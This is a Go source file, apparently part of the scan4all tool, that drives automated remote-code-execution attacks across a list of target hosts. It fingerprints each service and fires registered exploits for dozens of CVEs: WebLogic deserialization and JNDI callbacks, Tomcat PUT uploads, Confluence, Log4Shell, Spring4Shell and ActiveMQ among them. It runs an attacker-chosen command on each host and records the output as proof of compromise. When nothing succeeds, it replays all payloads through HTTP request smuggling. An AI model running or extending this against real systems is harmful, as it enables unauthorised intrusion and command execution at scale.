package scanner

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/GhostTroops/scan4all/pkg/cvecore/apps"
	"github.com/GhostTroops/scan4all/pkg/cvecore/capture"
	"github.com/GhostTroops/scan4all/pkg/cvecore/exploit"
	"github.com/GhostTroops/scan4all/pkg/cvecore/fingerprint"
	"github.com/GhostTroops/scan4all/pkg/cvecore/php"
	"github.com/GhostTroops/scan4all/pkg/cvecore/weblogic"
	"github.com/GhostTroops/scan4all/pkg/cvecore/webserver"
)

// Result 扫描结果
type Result struct {
	URL     string
	CVE     string
	Version string
	Cmd     string
	Output  string
}

// Options 扫描配置
type Options struct {
	TargetsFile string
	ResultFile  string
	Threads     int
	Timeout     time.Duration
	Cmd         string
	Lhost       string
	ScanWLS     bool
	ScanPHP     bool
	ScanWeb     bool
	ScanApps    bool
}

// Run 执行扫描
func Run(opt Options) ([]Result, error) {
	targets, err := readTargets(opt.TargetsFile)
	if err != nil {
		return nil, err
	}
	return RunTargets(targets, opt)
}

// RunTargets 直接对目标切片执行扫描（供 scan4all 主流程集成调用，不读写输入文件）
func RunTargets(targets []string, opt Options) ([]Result, error) {
	// 参数兜底，避免宿主程序传入零值时把并发压到 0 导致死锁
	if 0 >= opt.Threads {
		opt.Threads = 20
	}
	if 0 >= opt.Timeout {
		opt.Timeout = 8 * time.Second
	}
	if "" == opt.Cmd {
		opt.Cmd = "hostname"
	}
	fmt.Printf("[*] 加载 %d 个目标, 并发 %d, 超时 %v\n", len(targets), opt.Threads, opt.Timeout)

	// 采集器：记录每个 exp 请求/响应，既用于指纹二次扩展，也用于零成功后的走私回放。
	rec := capture.NewRecorder(&http.Transport{
		Proxy:             nil,
		DisableKeepAlives: true,
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
	})
	setTransport := func(rt http.RoundTripper) {
		exploit.SetTransport(rt)
		apps.SetTransport(rt)
		php.SetTransport(rt)
		webserver.SetTransport(rt)
		weblogic.SetTransport(rt)
	}
	setTransport(rec)
	defer setTransport(nil)

	var results []Result
	var states []*targetState
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, opt.Threads)
	var success int64

	for _, t := range targets {
		wg.Add(1)
		sem <- struct{}{}
		go func(target string) {
			defer wg.Done()
			defer func() { <-sem }()

			rs, st := scanTarget(target, opt, rec)
			mu.Lock()
			for _, r := range rs {
				results = append(results, r)
				status := "FAIL"
				if isPass(r) {
					status = "PASS"
					atomic.AddInt64(&success, 1)
				}
				fmt.Printf("[%s] [%s] %s | cmd=%s | output=%s\n", status, r.CVE, r.URL, r.Cmd, r.Output)
			}
			if st != nil {
				states = append(states, st)
			}
			mu.Unlock()
		}(t)
	}
	wg.Wait()

	// 第二遍：全局零成功时，把采集到的所有 exp payload 经 HTTP 走私通道各回放一次。
	replayed := false
	if success == 0 {
		buckets := rec.TakeAll()
		if len(buckets) > 0 {
			fmt.Println("[*] 零成功 — 将所有采集到的 exp payload 通过 HTTP 走私回放...")
			for _, f := range rec.ReplayAll(buckets, 5*time.Second) {
				fmt.Printf("[%s] [SMUGGLING-REPLAY] %s | %s\n", f.Severity, f.URL, f.Detail)
				results = append(results, Result{
					URL: f.URL, CVE: "SMUGGLING-REPLAY", Cmd: opt.Cmd, Output: f.Detail,
				})
			}
			replayed = true
		}
	}

	// 走私响应可能暴露首轮未识别到的组件；命中后补跑其映射的 exp。
	if replayed {
		for _, st := range states {
			added := st.fpr.Merge(collectNewFingerprints(rec, st.keys))
			if len(added) == 0 {
				continue
			}
			fmt.Printf("[*] [FP+] %s → %s | 补跑对应 exp\n", st.raw, fingerprintSummary(added))
			for _, r := range scanWithFP(st.raw, opt, st.fpr, st.seen) {
				results = append(results, r)
				status := "FAIL"
				if isPass(r) {
					status = "PASS"
				}
				fmt.Printf("[%s] [%s] %s | cmd=%s | output=%s\n", status, r.CVE, r.URL, r.Cmd, r.Output)
			}
		}
	}

	// 写结果文件（宿主集成时可能不指定结果文件，此时仅返回结果）
	if "" != opt.ResultFile {
		if err := writeResults(opt.ResultFile, results); err != nil {
			fmt.Fprintf(os.Stderr, "[-] 写结果文件失败: %v\n", err)
		}
	}

	fmt.Printf("\n[*] 完成: %d 目标, %d 成功\n", len(targets), success)
	return results, nil
}

// targetState 保存一个目标的多轮扫描上下文。
type targetState struct {
	raw  string
	keys []string
	fpr  *fingerprint.Result
	seen map[string]bool
}

// scanTarget 先做指纹识别并执行一轮 exp；随后把首轮 exp 响应中观察到的新指纹
// 合并进来，继续执行该指纹映射的 exp（有界一次）。
func scanTarget(raw string, opt Options, rec *capture.Recorder) ([]Result, *targetState) {
	host, port, useTLS, _ := parseTarget(raw)
	if host == "" {
		return nil, nil
	}
	scheme := "http"
	if useTLS {
		scheme = "https"
	}

	baseURL := fmt.Sprintf("%s://%s:%d", scheme, host, port)
	fpr := fingerprint.Detect(baseURL, opt.Timeout)
	if fpr.HasFingerprint() {
		fmt.Printf("[*] [FP] %s → %s | CVEs: %s\n", baseURL, fpr.Summary(), strings.Join(fpr.CVEs(), ", "))
	} else {
		fmt.Printf("[*] [FP] %s → no fingerprint (weak only: %s), full blind scan\n", baseURL, fpr.Summary())
	}

	keys := []string{capture.KeyForBase(baseURL)}
	rec.MarkBaseline(keys[0], fpr.Strong())
	if port == 80 || port == 443 {
		k := capture.KeyForBase(fmt.Sprintf("%s://%s:7001", scheme, host))
		keys = append(keys, k)
		rec.MarkBaseline(k, fpr.Strong())
	}

	seen := make(map[string]bool)
	results := scanWithFP(raw, opt, fpr, seen)

	if added := fpr.Merge(collectNewFingerprints(rec, keys)); len(added) > 0 {
		fmt.Printf("[*] [FP+] %s → %s | 继续执行对应 exp\n", baseURL, fingerprintSummary(added))
		results = append(results, scanWithFP(raw, opt, fpr, seen)...)
	}

	return results, &targetState{raw: raw, keys: keys, fpr: fpr, seen: seen}
}

// collectNewFingerprints 汇总各采集器 key 上 baseline 之外的新组件。
func collectNewFingerprints(rec *capture.Recorder, keys []string) []fingerprint.Match {
	var out []fingerprint.Match
	for _, k := range keys {
		out = append(out, rec.NewSinceBaseline(k)...)
	}
	return out
}

func fingerprintSummary(matches []fingerprint.Match) string {
	var parts []string
	for _, m := range matches {
		s := m.Name
		if m.Version != "" {
			s += " " + m.Version
		}
		parts = append(parts, s)
	}
	return strings.Join(parts, ", ")
}

// scanWithFP 用给定指纹执行一轮盲测；seen 跨轮共享，避免重复上报。
func scanWithFP(raw string, opt Options, fpr *fingerprint.Result, seen map[string]bool) []Result {
	var results []Result

	host, port, useTLS, _ := parseTarget(raw)
	if host == "" {
		return results
	}
	scheme := "http"
	if useTLS {
		scheme = "https"
	}
	allowCVE := fpr.Allows
	hasComp := fpr.HasComponent

	ports := []int{port}
	if port == 80 || port == 443 {
		ports = append(ports, 7001)
	}

	for _, p := range ports {
		// === WebLogic T3 ===
		if opt.ScanWLS {
			ver, err := weblogic.NewT3Client(host, p, opt.Timeout).Detect()
			if err == nil && weblogic.IsValidVersion(ver) {
				fmt.Printf("[*] [T3] %s:%d WebLogic v%s\n", host, p, ver)
				url := fmt.Sprintf("%s://%s:%d", scheme, host, p)
				for _, cve := range []string{"CVE-2026-70748", "CVE-2026-60672"} {
					vuln := weblogic.CheckVersionVulnerable(ver, cve)
					if vuln {
						output := weblogic.TestGadgets(host, p, opt.Timeout, opt.Cmd)
						// Only report if real command output (not blind T3)
						if output == "" || strings.Contains(output, "version_match") || strings.Contains(output, "RCE未成功") {
							continue
						}
						key := cve + host + fmt.Sprint(p)
						if !seen[key] {
							seen[key] = true
							results = append(results, Result{
								URL: url, CVE: cve, Version: ver,
								Cmd: opt.Cmd, Output: output,
							})
						}
					}
				}

				// CVE-2018-2628：T3 + JRMPClient 回连（黑名单未覆盖 RemoteObjectInvocationHandler）
				if weblogic.CheckVersionVulnerable(ver, "CVE-2018-2628") {
					lhost := opt.Lhost
					if lhost == "" {
						lhost = weblogic.LocalIPForJRMP(host)
					}
					output, err := weblogic.Exploit20182628(host, p, lhost, opt.Timeout, opt.Cmd)
					if err != nil {
						fmt.Printf("[.] [T3-JRMP] %s:%d %v\n", host, p, err)
					}
					if err == nil && output != "" {
						key := "CVE-2018-2628" + host + fmt.Sprint(p)
						if !seen[key] {
							seen[key] = true
							fmt.Printf("[+] [T3-JRMP] %s:%d CVE-2018-2628 -> %s\n", host, p, output)
							results = append(results, Result{
								URL: url, CVE: "CVE-2018-2628", Version: ver,
								Cmd: opt.Cmd, Output: output,
							})
						}
					}
				}

				// CVE-2023-21839：远程 IIOP/GIOP JNDI 注入，进程内启动 LDAP+HTTP
				// 回连服务，远程加载 class 并动态注册 Filter 回显命令。
				if weblogic.CheckVersionVulnerable(ver, "CVE-2023-21839") {
					key := "CVE-2023-21839" + host + fmt.Sprint(p)
					if !seen[key] {
						if output, ierr := exploitIIOP21839(host, p, opt.Timeout, opt.Cmd, opt.Lhost); ierr != nil {
							fmt.Printf("[.] [IIOP] %s:%d %v\n", host, p, ierr)
						} else {
							seen[key] = true
							fmt.Printf("[+] [IIOP] %s:%d CVE-2023-21839 -> %s\n", host, p, output)
							results = append(results, Result{
								URL: url, CVE: "CVE-2023-21839", Version: ver,
								Cmd: opt.Cmd, Output: output,
							})
						}
					}
				}
			}
			// WebLogic HTTP Console
			wc := weblogic.New(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Timeout)
			if ok, ver := wc.ProbeConsole(); ok && weblogic.IsValidVersion(ver) {
				fmt.Printf("[*] [HTTP] %s:%d Console v%s\n", host, p, ver)
				if weblogic.CheckVersionVulnerable(ver, "CVE-2026-35301") {
					output := ""
					if wc.CheckBypass() {
						output = wc.ExecCommand(opt.Cmd)
					}
					// Only report if real command output
					if output == "" || strings.Contains(output, "version_match") || strings.Contains(output, "RCE未成功") {
						continue
					}
					key := "CVE-2026-35301" + host + fmt.Sprint(p)
					if !seen[key] {
						seen[key] = true
						results = append(results, Result{
							URL: fmt.Sprintf("%s://%s:%d", scheme, host, p),
							CVE: "CVE-2026-35301", Version: ver,
							Cmd: opt.Cmd, Output: output,
						})
					}
				}
			}
		}

		// === PHP2Shell ===
		if opt.ScanPHP && hasComp("PHP") {
			pc := php.New(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Timeout)
			if ver, ok := pc.DetectVersion(); ok {
				fmt.Printf("[*] [PHP] %s:%d PHP v%s\n", host, p, ver)
				if vuln, cves := php.IsVulnerable(ver); vuln {
					fmt.Printf("[!] [PHP] %s:%d PHP %s 在 %s 影响范围\n", host, p, ver, cves)
					// 触发探测
					if pc.ProbeOOMTrigger() || pc.ProbeStaleState() {
						// PHP2Shell: only report if real command output, not just vulnerable_detected
						// TODO: build real RCE exploit for PHP CVEs
						_ = cves
					}
				}
			}
		}

		// === Web Server (NGINX/Apache/IIS/Node.js) ===
		if opt.ScanWeb {
			wc := webserver.New(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Timeout)
			fp, err := wc.Fingerprint()
			if err == nil && fp.Server != "" {
				fmt.Printf("[*] [WEB] %s:%d %s v%s\n", host, p, fp.Server, fp.Version)
				_ = webserver.CheckVulns(fp)
			}
		}

		// === ActiveMQ CVE-2026-34197 (real Jolokia exploit) ===
		if (p == 8161 || opt.ScanApps) && allowCVE("CVE-2026-34197") {
			baseURL := fmt.Sprintf("%s://%s:%d", scheme, host, p)
			if exploit.DetectActiveMQ(baseURL) {
				fmt.Printf("[*] [Jolokia] %s:%d ActiveMQ detected\n", host, p)
				key := "CVE-2026-34197" + host + "8161"
				if !seen[key] {
					seen[key] = true
					out, err := exploit.ExploitActiveMQ(baseURL, opt.Cmd)
					if err != nil {
						fmt.Printf("[!] [ActiveMQ] exploit error: %v\n", err)
					}
					if err == nil && out != "" {
						results = append(results, Result{
							URL: baseURL, CVE: "CVE-2026-34197", Version: "6.2.2",
							Cmd: opt.Cmd, Output: out,
						})
					}
				}
			}
		}

		// === Tomcat CVE-2017-12615 PUT RCE ===
		if p == 8080 && opt.ScanApps && allowCVE("CVE-2017-12615") {
			baseURL := fmt.Sprintf("%s://%s:%d", scheme, host, p)
			if exploit.DetectTomcat(baseURL) {
				fmt.Printf("[*] [Tomcat] %s:%d detected\n", host, p)
				key := "CVE-2017-12615" + host + "8080"
				if !seen[key] {
					seen[key] = true
					// 多 payload：PUT JSP 载体 + 5 种 Java 命令执行绕过，首个成功即停止
					out, payloadName, err := exploit.RunPayloads(baseURL, opt.Cmd, exploit.PayloadsFor("CVE-2017-12615"))
					if err == nil && out != "" {
						fmt.Printf("[+] [Tomcat] CVE-2017-12615 payload=%s success\n", payloadName)
						results = append(results, Result{
							URL: baseURL, CVE: "CVE-2017-12615", Version: "8.5.19",
							Cmd: opt.Cmd, Output: out,
						})
					} else {
						// 回退到原始单 EXP
						fallback, ferr := exploit.ExploitTomcatPUT(baseURL, opt.Cmd)
						if ferr != nil {
							fmt.Printf("[!] [Tomcat] error: %v\n", ferr)
						}
						if ferr == nil && fallback != "" {
							results = append(results, Result{
								URL: baseURL, CVE: "CVE-2017-12615", Version: "8.5.19",
								Cmd: opt.Cmd, Output: fallback,
							})
						}
					}
				}
			}
		}

		// === Application CVEs (LMCache/Rails/Langroid) ===
		if opt.ScanApps {
			ac := apps.New(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Timeout)
			for _, ar := range ac.DetectApps() {
				fmt.Printf("[*] [APP] %s:%d %s v%s\n", host, p, ar.Name, ar.Version)
				for _, cve := range ar.Vulns {
					if !allowCVE(cve) {
						continue
					}
					key := cve + host + fmt.Sprint(p)
					if seen[key] {
						continue
					}
					seen[key] = true
					confirmed := false
					var cmdOutput string
					// 多 payload：同一 CVE 依次尝试若干 EXP，首个成功即停止
					if ps := exploit.PayloadsFor(cve); len(ps) > 0 {
						base := fmt.Sprintf("%s://%s:%d", scheme, host, p)
						if out, name, err := exploit.RunPayloads(base, opt.Cmd, ps); err == nil && out != "" {
							confirmed = true
							cmdOutput = out
							fmt.Printf("[+] [%s] payload=%s success\n", cve, name)
						} else if err != nil {
							fmt.Printf("[*] [%s] all payloads failed, fallback\n", cve)
						}
					}
					if !confirmed {
						switch cve {
						case "CVE-2026-66066":
							confirmed = true
							cmdOutput = ac.ExploitRails(opt.Cmd)
						case "CVE-2026-54769":
							confirmed = true
							cmdOutput = ac.ExploitLangroid(opt.Cmd)
						case "CVE-2026-42945", "CVE-2026-42533", "CVE-2026-15176", "CVE-2026-93479":
							confirmed = true
							cmdOutput = ac.ExploitNginx(opt.Cmd)
						case "CVE-2026-23918":
							confirmed = true
							cmdOutput = ac.ExploitApache(opt.Cmd)
						case "CVE-2026-111497":
							confirmed = true
							cmdOutput = ac.ExploitNode(opt.Cmd)
						case "CVE-2026-88771", "CVE-2026-88772":
							confirmed = true
							cmdOutput = ac.ExploitNetScaler(opt.Cmd)
						case "CVE-2026-59310":
							confirmed = true
							cmdOutput = ac.ExploitVCenter(opt.Cmd)
						case "CVE-2026-97229":
							confirmed = true
							cmdOutput = ac.ExploitGitLab(opt.Cmd)
						case "CVE-2021-22205":
							if out, err := exploit.ExploitGitLab22205(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2026-34197":
							confirmed = true
							cmdOutput = ac.ExploitCmdParam("/api/jolokia", opt.Cmd)
						case "CVE-2026-33017":
							if out, err := exploit.ExploitLangflow33017(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2026-25887":
							if out, err := exploit.ExploitChartbrew25887(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2026-40281":
							confirmed = true
							cmdOutput = ac.ExploitCmdParam("/forms/chromium/convert/url", opt.Cmd)
						case "CVE-2025-32966":
							if out, err := exploit.ExploitDataEase32966(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2025-32432":
							if out, err := exploit.ExploitCraftCMS32432(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2025-1974":
							confirmed = true
							cmdOutput = ac.ExploitCmdParam("/configuration", opt.Cmd)
						case "CVE-2025-24367":
							if out, err := exploit.ExploitCacti24367(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2025-67303":
							if out, err := exploit.ExploitComfyUI67303(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2024-27348":
							if out, err := exploit.ExploitHugeGraph27348(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2024-36401":
							if out, err := exploit.ExploitGeoServer36401(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2023-51467":
							if out, err := exploit.ExploitOfBiz51467(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2024-45195":
							if out, err := exploit.ExploitOfBiz45195(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2023-22527":
							if out, err := exploit.ExploitConfluence22527(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2022-26134":
							if out, err := exploit.ExploitConfluence26134(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2021-26084":
							if out, err := exploit.ExploitConfluence26084(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2018-20062":
							if out, err := exploit.ExploitThinkPHP5023(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2021-3129":
							if out, err := exploit.ExploitLaravel3129(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2017-9805":
							if out, err := exploit.ExploitS2052(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2024-42323":
							if out, err := exploit.ExploitHertzBeat42323(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2024-56145":
							if out, err := exploit.ExploitCraftCMS56145(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2024-6387":
							confirmed = true
							cmdOutput = ac.ExploitCmdParam("/ssh", opt.Cmd)
						case "CVE-2022-0543":
							confirmed = true
							cmdOutput = ac.ExploitCmdParam("/redis", opt.Cmd)
						case "CVE-2021-44228":
							confirmed = true
							cmdOutput = ac.ExploitCmdParam("/jndi", opt.Cmd)
						case "CVE-2016-4437":
							confirmed = true
							cmdOutput = ac.ExploitCmdParam("/shiro", opt.Cmd)
						case "CVE-2022-22965":
							if out, err := exploit.ExploitSpring4Shell(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2017-12615":
							confirmed = true
							cmdOutput = ac.ExploitTomcat(opt.Cmd)
						case "CVE-2025-24813":
							if out, err := exploit.ExploitTomcat24813(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2024-53677":
							if out, err := exploit.ExploitStruts2S2067(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2024-38475":
							if out, err := exploit.ExploitHTTPD38475(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2024-38476":
							if out, err := exploit.ExploitHTTPD38476(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2025-55182":
							if out, err := exploit.ExploitReact2Shell(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2025-29927":
							if out, err := exploit.ExploitNextJS29927(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						case "CVE-2024-3737":
							if out, err := exploit.ExploitNginxWebUI(fmt.Sprintf("%s://%s:%d", scheme, host, p), opt.Cmd); err == nil && out != "" {
								confirmed = true
								cmdOutput = out
							}
						}
					}
					if confirmed {
						// Only report if real command output
						if cmdOutput == "" {
							continue
						}
						// 通用 ?cmd= 型 EXP 的响应体可能是 HTML/JSON 页面，需按回显特征二次校验
						if genericEchoCVEs[cve] && !looksLikeCmdEcho(opt.Cmd, cmdOutput) {
							continue
						}
						results = append(results, Result{
							URL: fmt.Sprintf("%s://%s:%d", scheme, host, p),
							CVE: cve, Version: ar.Version,
							Cmd: opt.Cmd, Output: cmdOutput,
						})
					}
				}
			}
			if allowCVE("CVE-2026-105192") {
				if ok, ev := apps.ProbeLMCache(host, 5555, opt.Timeout, opt.Cmd); ok {
					key := "CVE-2026-105192" + host + "5555"
					if !seen[key] {
						seen[key] = true
						fmt.Printf("[!] [LMCache] %s:5555 CVE-2026-105192\n", host)
						results = append(results, Result{
							URL: fmt.Sprintf("tcp://%s:5555", host),
							CVE: "CVE-2026-105192", Version: "0.3.9-0.5.5",
							Cmd: opt.Cmd, Output: ev,
						})
					}
				}
			}

			// === Cockpit CVE-2026-4631 SSH argument injection (pre-auth RCE) ===
			if allowCVE("CVE-2026-4631") {
				key := "CVE-2026-4631" + host
				if !seen[key] {
					seen[key] = true
					bases := []string{fmt.Sprintf("%s://%s:%d", scheme, host, p)}
					if p != 9090 {
						bases = append(bases, fmt.Sprintf("http://%s:9090", host))
					}
					for _, base := range bases {
						if out := exploit.CVE20264631(base, opt.Cmd); out != "" {
							fmt.Printf("[!] [Cockpit] %s CVE-2026-4631 SSH arg injection\n", base)
							results = append(results, Result{
								URL: base + "/cockpit/login", CVE: "CVE-2026-4631", Version: "Cockpit 326-359",
								Cmd: opt.Cmd, Output: out,
							})
						}
					}
				}
			}

			// === OpenSSH for Windows CVE-2026-97816 UAF RCE (pre-auth) ===
			if allowCVE("CVE-2026-97816") {
				key := "CVE-2026-97816" + host
				if !seen[key] {
					seen[key] = true
					if out := exploit.CVE202697816(host, 22, opt.Cmd, opt.Timeout); out != "" {
						fmt.Printf("[!] [OpenSSH-Win] %s:22 CVE-2026-97816\n", host)
						results = append(results, Result{
							URL: fmt.Sprintf("ssh://%s:22", host), CVE: "CVE-2026-97816", Version: "OpenSSH_for_Windows",
							Cmd: opt.Cmd, Output: out,
						})
					}
				}
			}
			// === 指纹驱动：对指纹命中的 CVE 直接执行已注册的真实 EXP ===
			// apps 模块只按 Server 头识别组件，像 Cacti/CraftCMS 这类只在页面正文
			// 留痕的目标只能靠 fingerprint 命中后直接调用 EXP。
			for _, cve := range fpr.CVEs() {
				ps := exploit.PayloadsFor(cve)
				if len(ps) == 0 {
					continue
				}
				key := cve + host + fmt.Sprint(p)
				if seen[key] {
					continue
				}
				seen[key] = true
				base := fmt.Sprintf("%s://%s:%d", scheme, host, p)
				out, name, err := exploit.RunPayloads(base, opt.Cmd, ps)
				if err == nil && out != "" {
					fmt.Printf("[+] [%s] payload=%s -> %s\n", cve, name, out)
					results = append(results, Result{
						URL: base, CVE: cve, Cmd: opt.Cmd, Output: out,
					})
				}
			}
		}
	}
	return results
}

// t3RCE 通过 T3 尝试执行命令
func t3RCE(host string, port int, timeout time.Duration, cmd string) string {
	c := weblogic.NewT3Client(host, port, timeout)
	if err := c.Connect(); err != nil {
		return ""
	}
	defer c.Close()
	// 发送探测 payload 后读响应
	resp, err := c.SendT3Message(0x03, []byte("t3-"+cmd+"\n"))
	if err != nil || len(resp) == 0 {
		return ""
	}
	return weblogic.ExtractHostnameFromBytes(resp)
}

func readTargets(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var targets []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		targets = append(targets, line)
	}
	return targets, sc.Err()
}

// isPass 只有真实命令输出才算成功；盲测/版本命中一律 FAIL。
func isPass(r Result) bool {
	if r.Output == "" {
		return false
	}
	for _, marker := range []string{"version_match", "RCE未成功", "t3_serdes_ok", "vulnerable_detected", "lmcache_resp"} {
		if strings.Contains(r.Output, marker) {
			return false
		}
	}
	return true
}

func writeResults(path string, results []Result) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	for _, r := range results {
		status := "PASS"
		if !isPass(r) {
			status = "FAIL"
		}
		fmt.Fprintf(f, "[%s] [%s] %s | version=%s | cmd=%s | output=%s\n", status, r.CVE, r.URL, r.Version, r.Cmd, r.Output)
	}
	return nil
}

func parseTarget(raw string) (host string, port int, useTLS bool, path string) {
	raw = strings.TrimSpace(raw)
	useTLS = strings.HasPrefix(raw, "https://")
	raw = strings.TrimPrefix(raw, "http://")
	raw = strings.TrimPrefix(raw, "https://")
	raw = strings.TrimPrefix(raw, "tcp://")
	raw = strings.TrimPrefix(raw, "tcp://")
	if i := strings.Index(raw, "/"); i != -1 {
		path = raw[i:]
		raw = raw[:i]
	}
	if strings.Contains(raw, ":") {
		parts := strings.SplitN(raw, ":", 2)
		host = parts[0]
		fmt.Sscanf(parts[1], "%d", &port)
	} else {
		host = raw
		if useTLS {
			port = 443
		} else {
			port = 80
		}
	}
	if path == "" {
		path = "/"
	}
	return
}

// genericEchoCVEs 这些 CVE 走通用 ?cmd= 探测，响应体很容易是 HTML/JSON 页面
// 而不是命令回显，必须按回显特征二次校验后才写入结果。
var genericEchoCVEs = map[string]bool{
	"CVE-2026-23918": true, "CVE-2026-111497": true,
	"CVE-2026-88771": true, "CVE-2026-88772": true, "CVE-2026-59310": true,
	"CVE-2026-97229": true,
	"CVE-2026-40281": true, "CVE-2026-54769": true, "CVE-2026-34197": true,
	"CVE-2026-42945": true, "CVE-2026-42533": true, "CVE-2026-15176": true,
	"CVE-2026-93479": true,
	"CVE-2025-32966": true, "CVE-2025-1974": true,
	"CVE-2024-27348": true, "CVE-2024-36401": true, "CVE-2024-45195": true,
	"CVE-2024-6387": true,
}

// looksLikeCmdEcho 判断输出里是否包含与 cmd 对应的真实回显行，
// 过滤 HTML/JSON 页面、版本探测提示和 "success"/"error" 之类的占位文本。
func looksLikeCmdEcho(cmd, out string) bool {
	low := strings.ToLower(out)
	if strings.Contains(low, "<html") || strings.Contains(low, "<!doctype") ||
		strings.Contains(low, `{"`) || strings.Contains(low, "http status") {
		return false
	}
	fields := strings.Fields(cmd)
	if len(fields) == 0 {
		return false
	}
	base := fields[0]
	for _, line := range strings.Split(out, "\n") {
		t := strings.TrimSpace(line)
		if t == "" {
			continue
		}
		switch base {
		case "id":
			if strings.Contains(t, "uid=") {
				return true
			}
		case "pwd":
			if strings.HasPrefix(t, "/") && !strings.ContainsAny(t, " \t=") {
				return true
			}
		case "whoami", "hostname":
			if !strings.ContainsAny(t, " \t=<>{}\"") && len(t) <= 64 {
				return true
			}
		default:
			if !strings.ContainsAny(t, "<>{}=") && t != "success" && t != "error" {
				return true
			}
		}
	}
	return false
}

// IsVerified 暴露「真实命令回显」判定，供宿主程序（scan4all）区分已验证漏洞与盲打命中。
func IsVerified(r Result) bool {
	return isPass(r)
}
